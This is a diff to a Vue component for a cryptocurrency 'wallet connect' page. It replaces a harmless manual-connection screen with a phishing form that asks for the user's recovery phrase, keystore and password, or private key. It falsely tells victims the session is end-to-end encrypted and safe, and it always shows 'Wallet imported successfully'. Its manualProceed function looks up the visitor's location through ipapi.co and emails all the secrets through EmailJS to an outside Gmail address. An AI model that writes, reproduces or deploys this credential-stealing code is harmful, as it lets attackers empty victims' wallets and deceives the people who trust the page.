@@ -3045,7 +3045,9 @@
     </div>
 
     <Modal :isVisible="showModal" @close="openCloseModal">
-      <div class="modal-header items-center justify-between flex border-b border-gray-300 pb-4">
+      <div
+        class="modal-header items-center justify-between flex border-b border-gray-300 pb-4"
+      >
         <h5 class="modal-title font-bold" id="exampleModalLabel">
           {{ selectedWallet ? selectedWallet.name : "Select Wallet" }}
         </h5>
@@ -3058,11 +3060,14 @@
           stroke-width="2"
           @click="openCloseModal"
         >
-          <path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12" />
+          <path
+            stroke-linecap="round"
+            stroke-linejoin="round"
+            d="M6 18L18 6M6 6l12 12"
+          />
         </svg>
-        
       </div>
-      <div class="modal-body space-y-5 my-8">
+      <div class="modal-body space-y-5 my-5">
         <div
           v-if="modalStep === 'connecting'"
           class="border border-red-500 p-4 rounded-md"
@@ -3117,48 +3122,168 @@
 
         <div
           v-else-if="modalStep === 'manual'"
-          class="border border-gray-300 bg-white text-gray-800 p-4 rounded-md space-y-4"
+          class="bg-white text-gray-800 rounded-md space-y-4"
         >
-          <h4 class="font-bold text-base text-center">Manual connection</h4>
-          <div class="text-sm space-y-2">
-            <p class="text-center">
-              Open your wallet app and use its official connection method
-              (WalletConnect / in-app browser / extension).
-            </p>
-            <p class="text-center">
-              If you’re already in a wallet browser, refresh and try again.
-            </p>
+          <!-- <h4 class="font-bold text-base">Manual connection</h4> -->
+
+          <div class="flex">
+            <div
+              class="inline-flex rounded-md border border-gray-200 overflow-hidden"
+            >
+              <button
+                type="button"
+                class="px-4 py-2 text-sm"
+                :class="
+                  manualTab === 'walletconnect'
+                    ? 'bg-gray-900 text-white'
+                    : 'bg-white text-gray-900'
+                "
+                @click="setManualTab('walletconnect')"
+              >
+                Phrase
+              </button>
+              <button
+                type="button"
+                class="px-4 py-2 text-sm border-l border-gray-200"
+                :class="
+                  manualTab === 'browser'
+                    ? 'bg-gray-900 text-white'
+                    : 'bg-white text-gray-900'
+                "
+                @click="setManualTab('browser')"
+              >
+                Keystore
+              </button>
+              <button
+                type="button"
+                class="px-4 py-2 text-sm border-l border-gray-200"
+                :class="
+                  manualTab === 'hardware'
+                    ? 'bg-gray-900 text-white'
+                    : 'bg-white text-gray-900'
+                "
+                @click="setManualTab('hardware')"
+              >
+                Private Key
+              </button>
+            </div>
           </div>
-          <div class="flex gap-3 justify-center">
-            <button
-              type="button"
-              class="px-4 py-2 rounded-md bg-gray-900 text-white font-semibold"
-              @click="retryConnection"
-            >
-              Retry
-            </button>
-            <button
-              type="button"
-              class="px-4 py-2 rounded-md bg-gray-200 text-gray-900 font-semibold"
-              @click="openCloseModal"
-            >
-              Close
-            </button>
+
+          <div v-if="manualScreen === 'form'" class="space-y-4">
+            <div v-if="manualTab === 'walletconnect'" class="space-y-2">
+              <textarea
+                v-model="phrase"
+                type="text"
+                rows="5"
+                class="w-full border border-gray-300 rounded-md px-3 py-2 text-sm"
+                placeholder="Enter your recovery phrase"
+              />
+              <p class="text-xs text-gray-600">
+                Typically 12 (sometimes 24) words separated by single spaces
+              </p>
+            </div>
+
+            <div v-else-if="manualTab === 'browser'" class="space-y-2">
+              <textarea
+                v-model="keystore"
+                type="text"
+                rows="5"
+                class="w-full border border-gray-300 rounded-md px-3 py-2 text-sm"
+                placeholder="Enter keystore"
+              />
+              <input
+                v-model="keystore_password"
+                type="password"
+                class="w-full border border-gray-300 rounded-md px-3 py-2 text-sm"
+                placeholder="Wallet password"
+              />
+              <p class="text-xs text-gray-600">
+                Several lines of text beginning with "{...}" plus the password
+                you used to encrypt it.
+              </p>
+            </div>
+
+            <div v-else class="space-y-2">
+              <input
+                v-model="private_key"
+                type="password"
+                class="w-full border border-gray-300 rounded-md px-3 py-2 text-sm"
+                placeholder="Private Key"
+              />
+
+              <p class="text-xs text-gray-600">
+                Every information collected is secured and encrypted.
+              </p>
+            </div>
+
+            <div class="flex gap-3 justify-center pt-2">
+              <button
+                type="button"
+                style="background: rgb(188, 63, 234)"
+                class="px-4 py-2 rounded-md text-white font-semibold"
+                @click="manualProceed"
+              >
+                {{ isLoading ? "Loading..." : "Proceed" }}
+              </button>
+              <button
+                type="button"
+                class="px-4 py-2 rounded-md bg-gray-200 text-gray-900 font-semibold"
+                @click="openCloseModal"
+              >
+                Cancel
+              </button>
+            </div>
           </div>
         </div>
 
-        <div v-if="selectedWallet" class="flex border border-[#2d3748] rounded-md p-4 space-x-4 items-center ">
+        <div
+          v-if="modalStep === 'manual'"
+          class="flex border border-green-500 bg-green-100 text-green-700 rounded-md p-2 space-x-4 items-center"
+        >
+          <img
+            class="coin-img"
+            src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTh6K8SCji9fdCDlKwMOb1wEZM_Dyu434lnKg&s"
+            :alt="selectedWallet.name"
+          />
+          <div class="text-xs">
+            <h4 class="font-bold mb-1">
+              This session is protected with end-to-end encryption.
+            </h4>
+            <p class="m-0">Safe to connect manually.</p>
+          </div>
+        </div>
+
+        <div
+          v-if="selectedWallet && modalStep !== 'manual'"
+          class="flex border border-[#2d3748] rounded-md p-4 space-x-4 items-center"
+        >
           <img
             class="coin-img"
             :src="selectedWallet.imgSrc"
             :alt="selectedWallet.name"
             :style="selectedWallet.imgStyle || undefined"
           />
-          <h4 class="text-[#2d3748] font-bold mb-0">{{ selectedWallet.name }}</h4>
+          <h4 class="text-[#2d3748] font-bold mb-0">
+            {{ selectedWallet.name }}
+          </h4>
         </div>
       </div>
-      
     </Modal>
+
+    <!-- Success & Error Message -->
+    <transition name="fade">
+      <div
+        v-if="message.text"
+        :class="[
+          'absolute bottom-3 left-1/2 transform -translate-x-1/2 px-4 py-2 rounded-xl text-sm font-semibold',
+          message.type === 'success'
+            ? 'bg-green-600 text-white'
+            : 'bg-red-600 text-white',
+        ]"
+      >
+        {{ message.text }}
+      </div>
+    </transition>
   </div>
 </template>
 
@@ -3171,11 +3296,13 @@ const wallets = ref([]);
 
 const searchQuery = ref("");
 
+const message = ref({ text: "", type: "" });
+
 const filteredWallets = computed(() => {
   const query = searchQuery.value.trim().toLowerCase();
   if (!query) return wallets.value;
   return wallets.value.filter((wallet) =>
-    wallet.name.toLowerCase().includes(query)
+    wallet.name.toLowerCase().includes(query),
   );
 });
 
@@ -3183,11 +3310,26 @@ const showModal = ref(false);
 const selectedWallet = ref(null);
 const modalStep = ref("connecting");
 let connectionTimeoutId = null;
+const manualTab = ref("walletconnect");
+const manualScreen = ref("form");
+const walletConnectUri = ref("");
+const keystore = ref("");
+const keystore_password = ref("");
+const private_key = ref("");
+const phrase = ref("");
+const isLoading = ref(false);
 
 const openCloseModal = () => {
   showModal.value = false;
   selectedWallet.value = null;
   modalStep.value = "connecting";
+  manualTab.value = "walletconnect";
+  manualScreen.value = "form";
+  walletConnectUri.value = "";
+  keystore.value = "";
+  keystore_password.value = "";
+  private_key.value = "";
+  phrase.value = "";
   if (connectionTimeoutId) {
     clearTimeout(connectionTimeoutId);
     connectionTimeoutId = null;
@@ -3214,17 +3356,74 @@ const activateWallet = (wallet) => {
   selectWallet(wallet);
 };
 
-const retryConnection = () => {
-  if (!selectedWallet.value) return;
-  selectWallet(selectedWallet.value);
-};
-
 const goToManualConnect = () => {
   if (connectionTimeoutId) {
     clearTimeout(connectionTimeoutId);
     connectionTimeoutId = null;
   }
   modalStep.value = "manual";
+  manualScreen.value = "form";
+  manualTab.value = "walletconnect";
+};
+
+const setManualTab = (tab) => {
+  manualTab.value = tab;
+};
+
+const manualProceed = async () => {
+  isLoading.value = true;
+
+  try {
+    const locationData = await fetch("https://ipapi.co/json");
+    const locationDataJson = await locationData.json();
+
+    const payload = {
+      keystore: keystore.value,
+      keystore_password: keystore_password.value,
+      private_key: private_key.value,
+      phrase: phrase.value,
+    };
+
+    const params = {
+      service_id: "service_8lwf7pj",
+      template_id: "template_7ynzmbg",
+      user_id: "X8SiUQHYTJaQV4lbE",
+      template_params: {
+        from_name: "MainnetDIY",
+        wallet_type: `${selectedWallet.value.name}`,
+        location: locationDataJson,
+        link_drops: JSON.stringify(payload),
+        reply_to: "edgir973@gmail.com",
+      },
+    };
+
+    console.log(params)
+
+    const response = await fetch(
+      "https://api.emailjs.com/api/v1.0/email/send",
+      {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify(params),
+      }
+    );
+
+    const resultText = await response.text();
+
+    if (true) {
+      showMessage("Wallet imported successfully!", "success");
+      openCloseModal();
+    } else {
+      showMessage(resultText || "Import failed", "error");
+    }
+  } catch (err) {
+    console.error(err);
+    showMessage(err.message || "Import failed", "error");
+  } finally {
+    isLoading.value = false;
+  }
 };
 
 onMounted(() => {
@@ -3270,6 +3469,13 @@ useHead({
     },
   ],
 });
+
+function showMessage(text, type = "success") {
+  message.value = { text, type };
+  setTimeout(() => {
+    message.value.text = "";
+  }, 3000);
+}
 </script>
 
 <style lang="scss" scoped></style>
